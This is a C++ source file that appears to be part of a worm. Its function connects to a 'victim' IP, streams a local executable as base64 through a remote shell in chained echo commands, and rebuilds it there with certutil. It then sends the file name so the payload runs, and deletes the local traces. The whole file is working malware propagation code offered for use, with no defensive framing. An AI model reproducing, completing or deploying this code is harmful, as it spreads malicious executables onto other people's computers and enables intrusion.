// return value:
// 0 : success
// 1 : error sock
#include "Base64P2P.h"

int Base64P2P(char *victim_ip, int port, std::string fileName) {
	int len;
	int sizeof_sa;
	int ret;
	u_long opt;

	struct sockaddr_in target_ip;
	struct sockaddr_in sa;
	int fd;
	std::string cmd = "";
	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return 1;

	memset(&target_ip, 0, sizeof(target_ip));
	target_ip.sin_family = AF_INET;
	target_ip.sin_port = htons(port);
	target_ip.sin_addr.s_addr = inet_addr(victim_ip);
	if (target_ip.sin_addr.s_addr == SOCKET_ERROR)
		return 1;
	if (connect(fd, (struct sockaddr*)&target_ip, sizeof(target_ip)) == SOCKET_ERROR)
		return 1;


	sizeof_sa = sizeof(sa);
	getsockname(fd, (struct sockaddr*)&sa, &sizeof_sa);

	Sleep(1000);
	printf("command\n");


	// Chuyển worm trực tiếp dùng base64 
	//kiểm tra nếu file tồn tại hay không

	if (_access(fileName.c_str(), F_OK) == -1) {
	}
	else {
		cmd = "certutil -encode " + fileName + " " + fileName + ".txt";
		ExecCmd(cmd);
	}
	if (_access(fileName.c_str(), F_OK) != -1) {
		FILE *file = fopen((fileName + ".txt").c_str(), "r");
		char line[128]; /* or other suitable maximum line size */
		int i = 0;
		line[0] = '\x00';
		cmd = "echo ";
		while ((fgets(line, sizeof line, file) != NULL)) /* read a line */
		{

			line[strlen(line) - 1] = '\x00';
			cmd += line + (std::string)">>test.b64&echo ";
			if (cmd.length() > 0x400)
			{
				//cmd = cmd.substr(0, cmd.length() - 6);
				cmd += "\r\n";
				//printf("%s\n", cmdstr.c_str());
				if (send(fd, cmd.c_str(), cmd.length(), 0) <= 0)
					goto closesocket_and_return;
				Sleep(10);
				fd_set fd_read;

				FD_ZERO(&fd_read);
				FD_SET(fd, &fd_read);

				//timeval tv;
				//tv.tv_sec = 0;
				//tv.tv_usec = 100;

				select(0, &fd_read, NULL, nullptr, nullptr);
				if (FD_ISSET(fd, &fd_read))
				{
					u_long sztBuf;
					ioctlsocket(fd, FIONREAD, &sztBuf);

					if (sztBuf != 0)
					{
						char * pBuf = (char*)calloc(sztBuf + 1, 1);
						recv(fd, pBuf, sztBuf, 0);
						free(pBuf);
					}
				}
				cmd = "echo ";
			}
		}
		//for the last lines
		cmd += "\r\n";
		//printf("%s\n", cmdstr.c_str());
		if (send(fd, cmd.c_str(), cmd.length(), 0) <= 0)
			goto closesocket_and_return;
		fclose(file);

		//delete file txt
		char ExePath[MAX_PATH];
		GetModuleFileNameA(0, ExePath, MAX_PATH);
		std::string NewTxtPath = (std::string)ExePath;
		NewTxtPath = NewTxtPath.substr(0, NewTxtPath.find_last_of("\\"));
		NewTxtPath += "\\" + fileName + ".txt";
		DeleteFileA(NewTxtPath.c_str());
	}

	cmd = "certutil -decode test.b64 " + fileName + "\r\n";
	if (send(fd, cmd.c_str(), cmd.length(), 0) <= 0)
		goto closesocket_and_return;
	//Wait 20 seconds for the victim to request the file,
	// Sleep(20000);
	cmd = fileName + "\r\n";
	//sprintf(cmdstr, (fileName + "\r\n").c_str());
	if (send(fd, cmd.c_str(), cmd.length(), 0) <= 0)
		goto closesocket_and_return;
	Sleep(2000);


closesocket_and_return:
	if (fd != 0)
		closesocket(fd);
	return 0;
}